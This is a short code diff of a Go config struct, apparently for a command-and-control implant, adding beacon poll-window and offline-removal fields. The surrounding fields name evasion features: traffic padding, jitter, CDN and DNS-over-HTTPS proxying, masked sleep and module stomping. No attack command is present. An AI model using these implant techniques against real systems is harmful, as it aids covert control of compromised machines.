@@ -109,7 +109,6 @@ type Config struct {
 	PreflightIntervalMax int `cbor:"30,keyasint"` // seconds
 
 	CAPEM            string `cbor:"24,keyasint"` // CA cert from server side
-	CAFingerprint    string `cbor:"25,keyasint"` // CA cert fingerprint
 	C2TransportProxy string `cbor:"26,keyasint"` // proxy for C2 transport
 	CDNProxy         string `cbor:"27,keyasint"` // websocket proxy, see go-cdn2proxy
 	DoHServer        string `cbor:"28,keyasint"` // DNS over HTTPS server, for name resolving
@@ -127,6 +126,8 @@ type Config struct {
 	PaddingMax   int `cbor:"56,keyasint"` // max bytes of random padding per CBOR frame
 	Jitter       int `cbor:"57,keyasint"` // percent jitter added to check-in interval
 	PollInterval int `cbor:"61,keyasint"` // C2 Beacon interval (seconds)
+	PollWindow   int `cbor:"62,keyasint"` // seconds to wait for commands after hello before masked sleep
+	OfflineGrace int `cbor:"63,keyasint"` // optional agent removal deadline override; 0 lets the agent derive it
 	// Module Stomping
 	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
 	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager
